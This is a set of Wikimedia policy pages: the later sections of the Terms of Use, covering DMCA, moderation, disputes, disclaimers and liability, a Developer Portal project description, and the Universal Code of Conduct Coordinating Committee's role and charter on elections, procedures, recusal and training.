 8. Modifications or additions to material that you reuse: When modifying or making additions to text that you have obtained from a Project Website, you agree to license the modified or added content under CC BY-SA 4.0 or later (or, as explained above, another license when exceptionally required by the specific Project edition or feature).
    When modifying or making additions to any non-text media that you have obtained from a Project website, you agree to license the modified or added content in accordance with whatever license under which the work has been made available.
    With both text content and non-text media, you agree to clearly indicate that the original work has been modified. If you are reusing text content in a wiki, it is sufficient to indicate in the page history that you made a change to the imported text. For each copy or modified version that you distribute, you agree to include a licensing notice stating which license the work is released under, along with either a hyperlink or URL to the text of the license or a copy of the license itself.




8. DMCA COMPLIANCE

The Wikimedia Foundation wants to ensure that the content that we host can be reused by other users without fear of liability and that it is not infringing the proprietary rights of others. In fairness to our users, as well as to other creators and copyright holders, our policy is to respond to notices of alleged infringement that comply with the formalities of the Digital Millennium Copyright Act ("DMCA"). Pursuant to the DMCA, we will terminate, in appropriate circumstances, users and account holders of our system and network who are repeat infringers on our Projects and services.

However, we also recognize that not every takedown notice is valid or in good faith. In such cases, we strongly encourage users to file counter-notifications when they appropriately believe a DMCA takedown demand is invalid or improper. For more information on what to do if you think a DMCA notice has been improperly filed, you may wish to consult the Lumen Database website.

If you are the owner of content that is being improperly used on one of the Projects without your permission, you may request that the content be removed by filing a notice under the DMCA. To make such a request, please email us at legalwikimediaorg or snail mail our designated agent.

Alternatively, you may make a request to our community, which often handles copyright issues faster and more effectively than the process prescribed under the DMCA. In that case, you can post a notice explaining your copyright concerns. For a non-exhaustive and non-authoritative list of the relevant processes for the different Project editions, visit the Copyright Problems page. Before filing a DMCA claim, you also have the option of sending an email to the community at infowikimediaorg.




9. THIRD-PARTY WEBSITES AND RESOURCES

You are solely responsible for your use of any third-party websites or resources. Although the Projects and Project Websites contain links to third-party websites and resources, we do not endorse and are not responsible or liable for their availability, accuracy, or the related content, products, or services (including, without limitation, any viruses or other disabling features), nor do we have any obligation to monitor such third-party content.




10. MANAGEMENT OF WEBSITES

The community has the primary role in creating and enforcing policies applying to the different Project editions. At the Wikimedia Foundation, we rarely intervene in community decisions about policy and its enforcement.

It is possible to notify us of illegal content, or content that violates our Terms of Use (including all policies and other documents incorporated by reference) for other reasons by contacting us directly. However, you can typically make a request directly to the Project's community: this may be more efficient, and is more consistent with our Projects' aim to empower the user community.

Each Project will usually provide "Help" or "Contact" pages for further guidance, or specific tools for reporting issues. Alternatively – if in doubt – you can ask members of the community for help, by sending an email to infowikimediaorg or a more language-specific address from the Volunteer Response Team page. Please note that these mailboxes are monitored by users of the Projects, not the Foundation. As a result, they should not be threatened or issued with legal demands.

If you contact the Foundation with a problem, we will typically explore whether and how existing community-led mechanisms can investigate and, where appropriate, resolve it.

In an unusual case, the need may arise, or the community may ask us, to address an especially problematic user or especially problematic content because of significant Project disturbance or dangerous behavior. In such cases, we reserve the right, at our sole discretion (or where legally compelled), to:

 * Investigate your use of the Projects or our services (a) to determine whether a violation of these Terms of Use, Project edition policy, or other applicable law or policy has occurred, or (b) to comply with any applicable law, legal process, or an appropriate governmental request;
 * Detect, prevent, or otherwise address fraud, false or unverifiable information, security, or technical issues or respond to user support requests;
 * Refuse, revert, disable, or restrict access to contributions of any user who violates these Terms of Use;
 * Ban a user from editing or contributing or block a user's account or access for actions violating these Terms of Use, including repeat posting of unlawful material under applicable law in line with human rights principles;
 * Take legal action against users who violate these Terms of Use (including reports to law enforcement authorities); and
 * Manage otherwise the Project websites in a manner designed to facilitate their proper functioning and protect the rights, property, and safety of ourselves and our users, licensors, partners, and the public.

Those Foundation moderation activities may be informed or performed by software (such as traffic flood ("Denial of Service") protection). In those cases human review is normally available, upon request.

In the interests of our users and the Projects, in the extreme circumstance that any individual has had their account or access blocked under this section, they are prohibited from creating or using another account on or seeking access to the same Project, unless we provide explicit permission. Without limiting the authority of the community, the Foundation itself will not ban a user from editing or contributing or block a user's account or access solely because of good faith criticism that does not result in actions otherwise violating these Terms of Use or community policies.

The Wikimedia community and its members may also take action when so allowed by the community or Foundation policies applicable to the specific Project edition, including but not limited to warning, investigating, blocking, or banning users who violate those policies. You agree to comply with the final decisions of dispute resolution bodies that are established by the community for the specific Project editions (such as arbitration committees); these decisions may include sanctions as set out by the policy of the specific Project edition.

Especially problematic users who have had accounts or access blocked on multiple Project editions may be subject to a ban from all of the Project editions, in accordance with the Global Ban Policy. In contrast to Board resolutions or these Terms of Use, policies established by the community, which may cover a single Project edition or multiple Projects editions (like the Global Ban Policy), may be modified by the relevant community according to its own procedures.

The blocking of an account or access or the banning of a user under this provision shall be in accordance with Section 13 of these Terms of Use.

If you believe we have not satisfactorily acted on a problematic content report, or if you have been subjected to a Foundation moderation action that you wish to challenge, you may be able to submit an appeal.  Other information about routes of appeal may also be explained to you at the time, or in Project-specific help pages.

We reserve the right to suspend (temporarily, or permanently) our handling of reports or other correspondence from users or third parties, whether about allegedly illegal or otherwise problematic content or conduct, or requesting appeals against moderation actions, if such correspondence was made in bad faith, repetitive, unfounded, and/or abusive. In appropriate circumstances, your email address may even be blocked on our email system(s), and you will then need to contact us at our postal address if you wish to further correspond with us during that block. For less serious cases (e.g. up to three polite emails about one or more meritless complaints), this is likely to be temporary. More frequent or more abusive communications are more likely to lead to permanent measures.




11. RESOLUTIONS AND PROJECT POLICIES

The Wikimedia Foundation Board of Trustees releases official policies from time to time. Some of these policies may be mandatory for a particular Project or Project edition, and, when they are, you agree to abide by them as applicable.




12. API TERMS

We make available a set of APIs, which include documentation and associated tools, to enable users to build products that promote free knowledge. By using our APIs, you agree to abide by all applicable policies governing the use of the APIs, which include but are not limited to the User-Agent Policy, the Robot Policy, and the API:Etiquette (collectively, "API Documentation"), which are incorporated into these Terms of Use by reference.




13. TERMINATION

Though we hope you will stay and continue to contribute to the Projects, you can stop using our services any time. In certain (hopefully unlikely) circumstances it may be necessary for either ourselves or the Wikimedia community or its members (as described in Section 10) to terminate part or all of our services, terminate these Terms of Use, block your account or access, or ban you as a user. If your account or access is blocked or otherwise terminated for any reason, your public contributions and a record of your activities on or in relation to the Projects (including any correspondence you have sent us) will be unaffected (subject to applicable policies), and you may still access our public pages for the sole purpose of reading publicly available content on the Projects. In such circumstances, however, you may not be able to access your account or settings. However, regardless of any other provision in these Terms of Use, we reserve the right to suspend or end the services at any time, with or without cause, and with or without notice. Even after your use and participation are banned, blocked or otherwise suspended, these Terms of Use will remain in effect with respect to relevant provisions, including Sections 1, 3, 4, 6, 7, 9-16, and 18.




14. DISPUTES AND JURISDICTION

Highlighted for emphasis

We hope that no serious disagreements arise involving you, but, in the event there is a dispute, we encourage you to seek resolution through the dispute resolution procedures or mechanisms provided by the Projects or Project editions and the Wikimedia Foundation. If you seek to file a legal claim against us, you agree to file and resolve it exclusively in a state or federal court located in San Francisco County, California. You also agree that the laws of the State of California and, to the extent applicable, the laws of the United States of America will govern these Terms of Use, as well as any legal claim that might arise between you and us (without reference to conflict of laws principles). You agree to submit to the personal jurisdiction of, and agree that venue is proper in, the courts located in San Francisco County, California, in any legal action or proceeding relating to us or these Terms of Use.

To ensure that disputes are dealt with soon after they arise, you agree that regardless of any statute or law to the contrary, any claim or cause of action you might have arising out of or related to use of our services or these Terms of Use must be filed within the applicable statute of limitations or, if earlier, one (1) year after the pertinent facts underlying such claim or cause of action could have been discovered with reasonable diligence (or be forever barred).

Marketing Company Mediations As described in section 4 of these Terms of Use, you agree to resolve violations of the Paid Contributions without Disclosure in a Marketing Company Mediation at the Foundation's discretion. Marketing Company Mediations are binding mediations where, at the end of either a half or full day session, any disputed items that remain unresolved will be decided by the mediator in a legally binding decision. They will be conducted in meetings by teleconference or videoconference. If an in-person meeting is required, then the Marketing Company Mediation will take place in San Francisco County, California. The parties will split all fees and expenses related to the mediation/arbitration equally.

You agree, as part of a Marketing Company Mediation, to cooperate with the Foundation, including by timely providing any documentation in your possession relating to your undisclosed paid editing activities including the accounts used, articles affected, and clients who purchased such services.

Marketing Company Mediations are subject to and governed by the Federal Arbitration Act to the extent that the mediator becomes an arbitrator. The prevailing party shall be entitled to recover its attorneys' fees (including all fees necessary to determine the applicability of the Marketing Company Mediation and to enforce the binding result) and all costs relating to the investigation and enforcement of its rights. A party may be deemed "prevailing" even if it is not successful on every claim asserted.

If for some reason the entirety of these Marketing Company Mediation requirements are found to be unenforceable, you agree to resolve any disputes as described in the beginning of this section.




15. DISCLAIMERS

Highlighted for emphasis

At the Wikimedia Foundation, we do our best to provide educational and informational content to a very wide audience, but your use of our services is at your sole risk. We provide these services on an "as is" and "as available" basis, and we expressly disclaim all express or implied warranties of all kinds, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. We make no warranty that our services will meet your requirements, be safe, secure, uninterrupted, timely, accurate, or error-free, or that your information will be secure.

We are not responsible for the content, data, or actions of third parties, and you release us, our directors, officers, employees, and agents from any claims and damages, known and unknown, arising out of or in any way connected with any claim you have against any such third parties. No advice or information, whether oral or written, obtained by you from us or through or from our services creates any warranty not expressly stated in these Terms of Use.

Any material downloaded or otherwise obtained through your use of our services is done at your own discretion and risk, and you will be solely responsible for any damage to your computer system or loss of data that results from the download of any such material. You agree that we have no responsibility or liability for the deletion of, or the failure to store or to transmit, any content or communication maintained by the service. We retain the right to create limits on use and storage at our sole discretion at any time with or without notice.

Some states or jurisdictions do not allow the types of disclaimers in this section, so they may not apply to you either in part or in full depending on the law.




16. LIMITATION ON LIABILITY

Highlighted for emphasis

The Wikimedia Foundation will not be liable to you or to any other party for any direct, indirect, incidental, special, consequential or exemplary damages, including but not limited to, damages for loss of profits, goodwill, use, data, or other intangible losses, regardless of whether we were advised of the possibility of such damage. In no event shall our liability exceed one thousand U.S. dollars (US$1,000.00) in aggregate. In the case that applicable law may not allow the limitation or exclusion of liability or incidental or consequential damages, the above limitation or exclusion may not apply to you, although our liability will be limited to the fullest extent permitted by applicable law.




17. MODIFICATIONS TO THESE TERMS OF USE

Just as the Wikimedia community's input is essential for the growth and maintenance of the Projects, we believe that community input is essential for these Terms of Use to properly serve our users. It is also essential for a fair contract. Therefore, we will provide these Terms of Use, as well as any substantial future revisions of these Terms of Use, to the community for comment at least thirty (30) days before the end of the comment period. If a future proposed revision is substantial, we will provide an additional 30 days for comments after posting a translation of the proposed revision in at least three languages (selected at our discretion). The community will be encouraged to translate the proposed revision in other languages as appropriate. For changes for legal or administrative reasons, to correct an inaccurate statement, or changes in response to community comments, we will provide at least three (3) days' notice.

Because it may be necessary to modify these Terms of Use from time to time, we will provide notice of such modifications and the opportunity to comment via the Project websites, and via a notification on WikimediaAnnounce-l. However, we ask that you please periodically review the most up-to-date version of these Terms of Use. Your continued use of our services after the new Terms of Use become official following the notice and review period constitutes an acceptance of these Terms of Use on your part. For the protection of the Wikimedia Foundation and other users like yourself, if you do not agree with our Terms of Use, you cannot use our services.




18. OTHER TERMS

These Terms of Use do not create an employment, agency, partnership, joint control or joint venture relationship between you and us, the Wikimedia Foundation. For the purposes of European Economic Area law, United Kingdom law, or other laws that involve a similar concept, you are not acting "under the authority of" the Foundation when you use the services. If you have not signed a separate agreement with us, these Terms of Use are the entire agreement between you and us. If there is any conflict between these Terms of Use and a signed written agreement between you and us, the signed agreement will control.

You agree that we may provide you with notices, including those regarding changes to the Terms of Use, by email, regular mail, or postings on the Projects or Project Websites.

If in any circumstance, we do not apply or enforce any provision of these Terms of Use, it is not a waiver of that provision.

You understand that, unless otherwise agreed to in writing by us, you have no expectation of compensation for any activity, contribution, or idea that you provide to us, the community, or the Projects or Project editions.

Notwithstanding any provision to the contrary in these Terms of Use, we (the Wikimedia Foundation) and you agree not to modify the applicable terms and requirements of any free license that is employed on the Projects or Project editions when such free license is authorized by these Terms of Use.

These Terms of Use were written in English (U.S.). While we hope that translations of these Terms of Use are accurate, in the event of any differences in meaning between the original English version and a translation, the original English version takes precedence.

If any provision or part of a provision of these Terms of Use is found unlawful, void, or unenforceable, that provision or part of the provision is deemed severable from these Terms of Use and will be enforced to the maximum extent permissible, and all other provisions of these Terms of Use will remain in full force and effect.


THANK YOU!

We appreciate your taking the time to read these Terms of Use, and we are very happy to have you contributing to the Projects and using our services. Through your contributions, you are helping to build something really big – not only an important collection of collaboratively edited reference Projects that provides education and information to millions who might otherwise lack access, but also a vibrant community of like-minded and engaged peers, focused on a very noble goal.

Wikimedia Developer Portal
A central place for developers to find Wikimedia key technical documents

Group: Wikimedia Technical Engagement Start: 2020-08 End: 2022-06 Backlog: phab:tag/Wikimedia-Developer-Portal Lead: Andre Klapper

PROBLEM

[edit]

"Upon arriving on the MediaWiki and Wikitech home pages, I was instantly lost." -- Ashwin Bhumbla

"MediaWiki documentation is not only infamously incomplete, but also terribly scattered." -- Waldyrious

Wikimedia has many potential entrance places for developers interested in certain technical areas. Based on conversations on Project:Support desk, mailing lists, IRC, Phabricator, in outreach programs, etc., some technical contributors have a hard time finding the information and key technical documents that they are interested in.

Some documentation should be more discoverable, some documentation is dispersed or duplicated across several websites, some of our documentation is outdated, some of our technology areas could be more discoverable.


GOAL

[edit]

Starting in 2020, the Developer Advocacy team works on an organization strategy for key technical documents: Understand challenges about finding and maintaining docs, identify key docs, and investigate ways to improve our workflows around documentation.

One tangible outcome of this initiative will be a central and single entry point ("developer portal") which links to our key technical documents.

This will allow existing and future technical contributors and developers to:

 * Find the information which they need to achieve a certain task
 * Discover available tools and technologies
 * Learn how to get started in Wikimedia technical areas

Further outcomes include checking the documents linked from the single entry point proposal for accuracy, and investigating improvements of processes around technical documentation.


SCOPE

[edit]
Wikimedia The Developer Portal is restricted to code related to Wikimedia free knowledge projects, such as Wikipedia and Wikidata. It does not duplicate the navigation of mediawiki.org or serve people interacting with non-Wikimedia instances of MediaWiki. Developer The Developer Portal covers how to write and interact with Wikimedia code. In order to define a clear, manageable scope, we've decided to exclude content about creating MediaWiki templates from the Developer Portal. The scope of the Developer Portal includes MediaWiki parser functions, Scribunto Lua scripting, user scripts, APIs, data sources, and other Wikimedia technical projects. The goal of this scope is to be inclusive of everyone interacting with Wikimedia code, regardless of whether they consider themselves developers. Portal The Developer Portal contains no documentation content. It is a navigation tool that links to docs hosted elsewhere, primarily on wikis.


PRINCIPLES

[edit]
Progressive disclosure To avoid information overload, limit the amount of content on each page. The Developer Portal aims to funnel users into specific contexts based on their goals, providing only relevant, contextualized information at each step. Well-lit paths The Developer Portal is not meant to be an exhaustive index of all Wikimedia technologies and documentation. To provide the best user experience possible, the Developer Portal should link to the best available documents and technologies that help accomplish a given task. The Developer Portal should not link to technologies that are experimental or redundant with other, more established technologies. Whenever possible, the Developer Portal should prioritize workflows that lower barriers to entry. Inclusivity The Developer Portal is designed to support the widest possible set of developers, including support for multiple languages, accessibility tools, and low-speed internet connections.

CORE AUDIENCES

[edit]

These personas and motivations have been identified for the proposed Wikimedia portal.

Experienced tool developers Active Wikimedians who have created or contributed to Wikimedia tools User journeys: #Build and discover tools, #Connect and learn New tool developers Active Wikimedians who are interested in learning to create, contribute to, and use Wikimedia tools, usually to solve a problem they face in maintaining their local wiki. They may not consider themselves developers. User journeys: #Build and discover tools, #Connect and learn Open source contributors Developers who want to use their skills to contribute to Wikimedia. They may be volunteers or employees of the Wikimedia Foundation or affiliates. User journeys: #Contribute to Wikimedia open source, #Connect and learn Content reusers Developers who want to use Wikimedia content in their projects, usually with read-only access. They may or may not be active Wikimedians. User journeys: #Use content or data, #Get started Data consumers and researchers Data scientists, machine learning engineers, and researchers who want to use Wikimedia data in their projects.[1] They may or may not be active Wikimedians. User journeys: #Use content or data, #Get started Students Students who are learning programming and are interested in Wikimedia. They can be university students, independent learners, or outreach program participants. User journeys: #Contribute to Wikimedia open source, #Connect and learn


USER JOURNEYS

[edit]

The following user journeys [2]evolved out of our research into user personas, motivations, and the tasks that users are trying to complete when they seek documentation. The information architecture of the developer portal implements these goals and tasks as site sections and links to key landing pages. Read more about this in our corresponding blog post on Diff.

PROPOSE CONTENT CHANGES

Please propose content additions or content changes in a Phabricator task. (Learn more about Phabricator.)

We would like to keep content on the portal limited. Pages should not duplicate other pages. Pages must be high quality and helpful. Please be aware of the user journeys. Pages which are proposed to be linked must follow the documentation guide for accuracy and consistency.

The proposed changes will be reviewed by the Tech Docs team.

Textual content is licensed under CC-BY-SA 4.0.


PROPOSE CODE CHANGES

Before submitting a change to the Developer Portal codebase, please open a task in Phabricator to get feedback on your plans.

To submit a code change:

 1. Set up your access to Wikimedia Gerrit.
 2. Set up your local development environment for the Developer Portal, and make the changes.
    Your patch should not change any files in data/locale other than the files in data/locale/en. Local files in languages other than English are updated through the Developer Portal's integration with translatewiki.net.
 3. Follow the commit message guidelines and the Gerrit tutorial to submit your change. The proposed changes will be reviewed by the Tech Docs team.
    If you see a test failure on your patch in Gerrit, make sure you have built the site to ensure that your changes are correctly reflected in the translation files.

Code is licensed under GNU GPL version 3 or later.


TRANSLATE CONTENT TO YOUR LANGUAGE

Please translate content on translatewiki.net. Your translations will be regularly merged into the codebase automatically. After a while, the latest codebase will be deployed on developer.wikimedia.org and translations will be available to anyone visiting the website.

The Universal Code of Conduct Coordinating Committee (U4C) is an enforcement structure dedicated to providing an equitable and consistent implementation of the Universal Code of Conduct (UCoC).


FUNCTIONS AND RESPONSIBILITIES

Policies, procedures and processes that guide the U4C’s work are defined in the Charter which was developed by a Building Committee and was ratified through a movement-wide vote in January-February 2024.

More in detail, functions and responsibilities of the Committee are described in Sections 1.1 and 1.2 of the Charter.

According to the charter, the U4C:

 * Handles complaints and appeals in the circumstances outlined in the Enforcement Guidelines, including but not limited to:
   * Lack of local self-governance capacity to enforce the UCoC;
   * Consistent local decisions that conflict with the UCoC;
   * Refusal of local self-governance structures and teams to enforce the UCoC;
   * Lack of resources or lack of will to address issues that prevent the adequate enforcement of the UCoC through local self-governance processes;
 * Performs any investigations necessary to resolve said complaints and appeals;
 * Provides resources for communities on UCoC best practices, such as material for mandatory trainings, quality assurances for training resources created by movement members and organizations that go beyond the basic UCoC training material the U4C itself oversees, and other resources as needed;
 * Provides a final interpretation of the UCoC Enforcement Guidelines and the UCoC if the need arises, in collaboration with community members enforcement structures;
 * Assesses the effectiveness of UCoC enforcement and provides recommendations for improvement.

Note: The U4C will not take cases that do not primarily involve violations of the UCoC, or its enforcement.

The U4C is also responsible for organizing the annual review of the Universal Code of Conduct and its Enforcement Guidelines.


HOW TO CONTACT U4C

Users who would like to contact the committee may do so by emailing u4cwikimedia.org.

Universal Code of Conduct

 * Enforcement guidelines
 * Coordinating Committee (U4C) charter
 * Project overview
 * Frequently asked questions
 * Training modules

The Universal Code of Conduct Coordinating Committee (U4C), reflective of the global community, is an enforcement structure dedicated to providing an equitable and consistent implementation of the UCoC.

It is a co-equal body to other high-level decision-making bodies such as NDA-Arbitration Committees and Stewards. The U4C determines if there has been a systemic failure by a Wikimedia group or community in enforcing the UCoC. The committee provides quality assurance of UCoC-related training materials, and oversees the annual UCoC and Enforcement Guidelines (EG) community review.

This charter details the scope and purpose of the U4C, its selection, membership roles, basic procedures, as well as policies and precedent.


1. PURPOSE AND SCOPE


1.1. FUNCTIONS

The U4C scope includes:

 * Monitoring reports of UCoC breaches. The U4C may conduct additional investigations and take actions where appropriate.
 * Observing the state of UCoC enforcement across all Wikimedia online and offline spaces, as ratified by the Wikimedia Foundation Board of Trustees in 2020.
 * Suggesting suitable changes to the UCoC and the UCoC Enforcement Guidelines for the Wikimedia Foundation and the community to consider as part of the UCoC annual review.
   * U4C cannot change either document on its own.
 * Assisting the Wikimedia Foundation and other stakeholders in handling cases under their jurisdiction, when requested.


1.2. RESPONSIBILITIES

The U4C has the following responsibilities:

 * Handles complaints and appeals in the circumstances outlined in the Enforcement Guidelines, including but not limited to:
   * Lack of local self-governance capacity to enforce the UCoC;
   * Consistent local decisions that conflict with the UCoC;
   * Refusal of local self-governance structures and teams to enforce the UCoC;
   * Lack of resources or lack of will to address issues that prevent the adequate enforcement of the UCoC through local self-governance processes;
 * Performs any investigations necessary to resolve said complaints and appeals;
 * Provides resources for communities on UCoC best practices, such as material for mandatory trainings, quality assurances for training resources created by movement members and organizations that go beyond the basic UCoC training material the U4C itself oversees, and other resources as needed;
 * Provides a final interpretation of the UCoC Enforcement Guidelines and the UCoC if the need arises, in collaboration with community members enforcement structures;
 * Assesses the effectiveness of UCoC enforcement and provides recommendations for improvement.

In addition to the above:

 * The U4C will not take cases that do not primarily involve violations of the UCoC, or its enforcement.
 * The U4C may delegate its final decision making authority except in instances of severe systemic issues. The U4C’s responsibilities are explained in the context of other enforcement structures in 3.1.2 of the UCoC Enforcement Guidelines.


1.3. MEMBERSHIP

The U4C will consist of 16 community voting members and up to two non-voting members appointed by the Wikimedia Foundation. Each voting member fulfills a two-year term, except the inaugural election (see 3.2).

The Wikimedia Foundation may appoint up to two non-voting members and select additional support staff as requested by the U4C.


1.4. CONFLICT OF INTEREST

Individual voting members of the U4C do not have to resign from other positions (eg. local administrator (sysop), member of ArbCom) but cannot be employed as staff or contractors by the Wikimedia Foundation or Foundation-affiliated organizations nor may they be members of the Wikimedia Foundation Board of Trustees.


2. ELECTIONS AND TERMS


2.1. MEMBER ELIGIBILITY

Each member and candidate must:

 * Comply with the UCoC.
 * Be at least 18 years old and sign the Confidentiality agreement for nonpublic information (NDA) with the Wikimedia Foundation once they are elected.
 * Have not been blocked on any Wikimedia project nor have an active event ban in the past one year. Candidates who are blocked may appeal to the Election Committee, who may make an exception.
 * Self-identify their home wiki(s) and the region they are from publicly.
 * Meet any other eligibility requirements determined during the election process.
 * Be a registered member of at least one Wiki project for at least 365 days and have a minimum of 500 edits.

The Elections Committee will have the final authority to decide whether candidates meet eligibility requirements.


2.2. DISTRIBUTION OF SEATS

2.2.1. REGIONAL DISTRIBUTION

To ensure the U4C represents the diversity of the movement, eight representatives, with one representative from each region will be elected by regional distribution. According to the Wikimedia Foundation's regional approach, the regional distribution will be as follows:

 * North America (USA and Canada)
 * Northern and Western Europe
 * Latin America and Caribbean
 * Central and East Europe (CEE)
 * Sub-Saharan Africa
 * Middle East and North Africa
 * East, South East Asia and Pacific (ESEAP)
 * South Asia

2.2.2. COMMUNITY AT LARGE

Eight representatives from the Community at large will be elected.


2.3. TERMS

U4C membership will be for a two-year term, except the first election.

For the first election, Regional Candidates will serve two-year terms and at-large members will serve a one year term.


2.4. ELECTIONS

Annual elections to select voting members of the U4C will be overseen by the U4C and administered by the Elections Committee, in cooperation with the U4C. For the first election, the U4C Building Committee (U4CBC) will take the place of the U4C.

Candidates will have to satisfy the membership requirements stated in section 2.1.

The inaugural election of the U4C will be held as soon as practical, following the successful completion of the U4C Charter ratification process.

The Election Process follows the timeline below:

 * Determining the date of the election, its timeline, and the number of regional and at-large seats by the U4C at least one month before the start of the election
 * Opening of the process of election by the Elections Committee
 * Nomination period – Nominations are accepted during this time
 * Verification period of the candidates
 * Question and Answer period – Candidates answer questions from the community
 * Voting period – Eligible voters can vote for the candidates


2.5. VOTING PROCESS

 * Voting is conducted by secret ballot, with voters leaving support, oppose and neutral votes for each candidate.
 * Voters are able to vote for candidates from all regions.
 * Neutral votes will not count.
 * Voter eligibility will be decided by the Elections Committee.
 * The candidate must have 60% or higher of votes as calculated by support/(support + oppose). After this qualification:
   * For each candidate the number of opposes will be subtracted from the number of supporters. The candidates with the highest difference will be elected to each seat.
   * If two candidates have the same difference then the percentage calculated by support/(support + oppose) will be used as a tiebreaker.

After the first session of the U4C, the U4CBC will be dissolved and the U4C will begin work as soon as possible.


2.6. VACANCIES

If there is an empty seat, whether because of resignations, removals, or no candidate was chosen for a regional seat in an election, the U4C may leave the seat empty and temporarily fill it during the next election, or the U4C may call a special election. An additional option in the case of resignation or removal is that the U4C may appoint a member who ran within the most recent election and received at least 60% support.

Members who fill a vacant seat will serve out the remainder of the term of the seat they are filling.


3. INTERNAL PROCEDURES

The U4C may create or modify their internal procedures as long as it is within their scope. There should be fairness and impartiality among members in the group's processes. Whenever appropriate, the U4C should invite community feedback on intended changes prior to implementing them.


3.1. INTERNAL POLICY AND PRECEDENT

The U4C does not create new policy and may not amend or change the UCoC and its Enforcement Guidelines. The U4C instead applies and enforces the UCoC as defined by its scope.

Previous decisions may be taken into account only to the extent that they remain relevant in the current context, as community policies, guidelines and norms evolve over time.

The U4C may, however, suggest changes to the UCoC and Enforcement Guidelines for the Wikimedia Foundation and the community to consider as part of the annual review process organized by the U4C.


3.2. CONDUCT OF U4C MEMBERS

U4C members should:

 * Actively engage in the U4C work, and inform the U4C at the start of any absence from U4C participation.
 * Respond in a timely and suitable manner to concerns about their conduct.
 * Maintain the confidentiality of private information shared with the U4C, including private correspondence and non-public personal information.
 * Maintain collegial relations with their fellow U4C members and work to productively resolve interpersonal conflicts.
 * Uphold the idea that no U4C member is more or less powerful than any other member.
 * Strive to act in a transparent manner, providing explanations for their decisions whenever possible while maintaining appropriate confidentiality.
 * Be knowledgeable about global policies, including the Universal Code of Conduct, and should work to gain knowledge of local policies and culture for any work the U4C handles.

Any U4C member who repeatedly or grossly violates the expectations outlined above may be suspended or removed by public committee resolution. This public committee resolution must be supported by two-thirds of all U4C members, excluding the following from the voting process:

 * The U4C member facing suspension or removal, and;
 * Any U4C member who does not respond within 30 days to any attempts to solicit their feedback on the resolution through all known methods of written communication.


3.3. TRANSPARENCY AND CONFIDENTIALITY

Complaints accepted shall be reported publicly on-wiki with at least minimal information.

Work decided shall be reported publicly on-wiki, stating account names, projects, dates and a rudimentary case description. If any information is unsuitable for public reports due to privacy or legal reasons, reports shall anonymize it by broadening details or even omit the respective information as appropriate.

If a U4C member breaches confidentiality agreements, it is important to address the issue through appropriate internal disciplinary actions, if necessary. Breaches of the Privacy Policy, the Access to nonpublic personal data policy, the CheckUser policy and the Oversight policy are also investigated by the Ombuds Commission. The Committee should conduct an investigation to determine whether the breach was an error or intentional. The committee may recommend to the Wikimedia Foundation to revoke a confidentiality agreement if an investigation determines this is warranted.


3.4. QUORUM

The U4C can seat with any number of members, but no decision or vote can be taken by the Committee unless the quorum of 50% (8 members) of the voting members (16 members) is attained. When there is no quorum, the U4C will continue to work on matters where no vote is needed and call a special election if needed.


3.5. SUBCOMMITTEES

The U4C Building Committee suggests that at least two subcommittees are created within the U4C at the time of formation. One subcommittee for the prevention, training and reports pertaining to the U4C work and the second subcommittee for the review and handling of cases.


3.6. STRUCTURED SUPPORT

Some work may necessitate certain structured support. The U4C may form subcommittees or designate members for particular tasks or roles as appropriate to address the work of the U4C.

The Wikimedia Foundation will provide tools for the Committee to help it accomplish its work (e.g. secure communication tools, private wiki, etc). The Foundation may appoint additional support staff as requested by the U4C.


3.7. TOOLS

The Committee can take all measures it deems appropriate and proportionate to adhere to its mandate and address systemic failures to adequately enforce the UCoC in line with the enforcement guideline and this policy. This includes creating or requesting user rights for committee members or its delegates for administration (local/global Wiki and MediaWiki tools), supporting tools like mailing lists and private wiki, and other tools like the Private Incident Reporting System to support operations of the U4C, to be created and administered by the Wikimedia Foundation and the stewards during the term of U4C members.

Any rights granted for U4C committee purposes must be used only for U4C actions, investigations and emergency cases unless they have other administrative rights granted from local or global processes.


3.8. RECUSAL

A U4C member may recuse themselves from any work, or from any aspect of the work, with or without explanation, and it’s required when a conflict of interest arises. This situation may result in a member of the U4C participating in the discussions about the work, but not the voting process.

Any U4C member participating in their U4C member capacity regarding work from a project or affiliate they participate in has the responsibility of the decision to recuse themselves. Members of the U4C will not participate in the work if they have been directly involved with the work as a result of their other positions or other activities. This decision is still subject to a vote by the whole membership of the U4C. Any U4C member may choose to withdraw from the recusal vote, but still participate in discussions of recusals from the work.

Typically, a conflict of interest regarding U4C work includes personal involvement in the substance of the dispute or significant personal involvement with one of the parties involved in the work. Previous interactions with the parties as routine editor, administrator or U4C interactions are not usually grounds for recusal.

3.8.1. PROCESS AND PROCEDURES REGARDING REQUESTING MEMBER RECUSAL

If a person believes a U4C member should recuse themselves from certain work of the U4C, the person has to send their request to the U4C asking for the person to recuse themselves and identify the work and state their rationale. A member of the U4C may comply with the request to recuse themselves or a vote of the membership of the U4C will happen, excluding the affected member or members.

The U4C should reply to the request before starting to vote on the work. Requests for recusal after the work has entered the voting stage will not be granted, except in extraordinary circumstances.


3.9. RELATIONSHIPS

The U4C may issue formal or informal advice and interpretation of the UCoC. When possible, the U4C should respond to requests from other high level decision-making bodies, the Wikimedia Foundation Board of Trustees, or the Wikimedia Foundation for advice or interpretation. Other groups or individuals may also request advice and interpretation from the U4C. Where appropriate, the U4C should publicly document their formal advice and interpretation.

3.9.1. RELATIONSHIP WITH OTHER MOVEMENT GOVERNMENT STRUCTURES

According to the UCoC Enforcement Guidelines, depending on the situation, the U4C can act as a high level decision-making body about the UCoC and as a peer group to other high level decision making bodies. The Committee's role is to provide resources for communities on UCoC best practices and act as the final recourse in situations where there are systemic issues by local groups to enforce the UCoC on their own.

For cases involving Affiliate staff, the U4C should handle the case jointly with the Affiliate and/or AffCom. The U4C may take actions regarding staff in Wikimedia movement spaces and may recommend other action to the Affiliate.

Movement government structures may also refer UCoC enforcement cases or appeals, even those which would not normally be in the scope of the U4C, to the U4C. The U4C may decide whether or not to hear those cases or appeals according to its typical procedures.

Requests for advice or interpretation or case referrals should generally be made on Meta-wiki, except when not appropriate for privacy reasons. For situations involving privacy, use of the dedicated email address for the U4C is expected.


4. TASKS


4.1. UCOC AND ENFORCEMENT TRAINING RESOURCES

The U4C will oversee the creation and maintenance of training resources, as well as coordinating with the Wikimedia Foundation on translation of such training resources.

Three basic training modules shall cover as mandated in the enforcement guidelines will include:

 * Orientation
 * Identification and reporting
 * Complex cases and appeals

These modules will be publicly accessible, on platforms such as on learn.wiki, and must be translated in cooperation with the Wikimedia Foundation into as many languages as possible. The list or number of languages will be determined by the U4C.

